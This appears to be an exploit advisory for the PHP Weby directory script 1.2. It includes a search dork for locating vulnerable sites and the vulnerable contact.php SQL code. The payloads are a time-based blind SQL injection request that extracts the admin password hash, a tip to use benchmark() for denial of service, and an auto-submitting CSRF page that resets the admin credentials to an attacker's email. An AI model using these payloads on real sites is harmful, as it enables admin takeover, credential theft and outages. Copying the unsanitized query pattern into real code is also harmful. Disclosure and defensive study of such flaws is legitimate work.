@@ -1,0 +1,133 @@
+===========================================
+Vulnerable Software: PHP Weby directory software version 1.2
+Vendor: http://phpweby.com
+Download: ht*p://phpweby.com/down/phpwebydirectory.zip
+Vuln: Blind SQL injection && CSRF
+Dork: intext:Powered by PHP weby software
+===========================================
+About Software:
+
+Php Weby directory script is a powerful and easy-to-use FREE link management
+script with numerous options for running a directory, catalog of sites or a simple
+link exchange system. Create a general directory and have users submit their 
+favorite sites and charge if you want for the review.
+Or create regional directory for your town or state and sell advertising,
+or niche directory about a topic you love or know.
+
+Features include an integrated payment system with PayPal,
+link validation, SEO urls, unlimited categories and subcategories,
+reciprocal linking, link editor,
+template driven system and many more. Check them all here.
+Php weby free link directory script is licensed under GNU GPL license.
+Link to http://phpweby.com can NOT be removed. Contact us at the forums for more information. .
+===========================================
+Tested On: Debian squeeze 6.0.6
+Server version: Apache/2.2.16 (Debian)
+Apache traffic server 3.2.0
+MYSQL: 5.1.66-0+squeeze1
+PHP 5.3.3-7+squeeze14 with Suhosin-Patch (cli) (built: Aug  6 2012 20:08:59)
+Copyright (c) 1997-2009 The PHP Group
+Zend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologies
+with Suhosin v0.9.32.1, Copyright (c) 2007-2010, by SektionEins GmbH
+===========================================
+
+Here is one of Vulnerable Code example:
+
+//contact.php
+==============SNIP BEGINS===============
+if($capt)
+{
+unset($capt);
+if($_POST['fullname']=='' || $_POST['subject']=='' || $_POST['message']=='' || $_POST['mail']=='')
+$smarty->assign('error','Please complete the form!');
+else
+{
+$c=$db->Execute("INSERT INTO contacts(fullname,subject,message,mail,ip,timehour) values('" . $_POST['fullname'] . "','" . $_POST['subject'] . "','" . $_POST['message'] . "','" . $_POST['mail'] . "','" . $_SERVER['REMOTE_ADDR']."','".date('r'). "')");
+if($c===false)
+$smarty->assign('error','Unknown error occured.');
+else
+$smarty->assign('added',1);
+
+===========SNIP ENDS HERE================
+
+
+===============Exploitation ===============
+METHOD: $_POST
+URL: http://site.tld/contact.php
+
+Headers:
+
+Host: hacker1.own
+User-Agent: UiUiUiUiUi Ping And UiUiUiUiUi And Pong:((
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 245
+
+
+REQ BODY:
+
+fullname=Ping And Pong Is Interesting Game xD%5C&mail=sssssssssssssssssss&subject=,(select case((select mid(`pass`,1,1) from admin_area limit 1 offset 0)) when 0x32 then sleep(10) else 0 end) ,1,2,3,4)-- and 5!=('Advertising+Inquiry&message=TEST
+
+
+===================EOF===================
+
+Here is how it looks:
+(I prefer timebased way because simply extracting and then inserting hash to table is not usefull anymore.Only admin can see it from admin panel).
+
+IMAGE 1: http://s017.radikal.ru/i420/1301/c6/11128cbea352.png
+COPY IMAGE: http://oi47.tinypic.com/2ptp79g.jpg
+
+
+Also this type of sql injections(INSERT/UPDATE) is usefull to create Denial of Service conditions against target site/server.
+If so simply benchmark() is your best friend.
+
+
+Second Vulnerability is: CSRF
+
+Simple exploit to change admin username/password/email:
+Login/password will be change to pwned and email to : admin@toattacker.tld
+
+<body onload="javascript:document.forms[0].submit()">
+<form action="http://server/phpweb/admin/options.php?r=admin" method="post">
+<input type="text" name="ADMIN_NAME" value="admin"/>
+<input type="text" name="ADMIN_MAIL" value="admin@toattacker.tld"/>
+<input type="text" name="usr" value="pwned"/>
+<input type="password" name="pass1" value="pwned"/>
+<input type="password" name="pass2" value="pwned"/>
+<input type="hidden" name="oldusr" value="admin"/>
+<input type="submit" value="Save" class="ss"/>
+</form>
+
+
+
+====================================
+           KUDOSSSSSSS
+====================================
+packetstormsecurity.org
+packetstormsecurity.com
+packetstormsecurity.net
+securityfocus.com
+cxsecurity.com
+security.nnov.ru
+securtiyvulns.com
+securitylab.ru
+secunia.com
+securityhome.eu
+exploitsdownload.com
+osvdb.com
+websecurity.com.ua
+1337day.com
+itsecuritysolutions.org
+
+to all Aa Team + to all Azerbaijan Black HatZ
++ *Especially to my bro CAMOUFL4G3 *
+To All Turkish Hackers.
+
+Also special thanks to: ottoman38 & HERO_AZE
+====================================
+
+/AkaStep
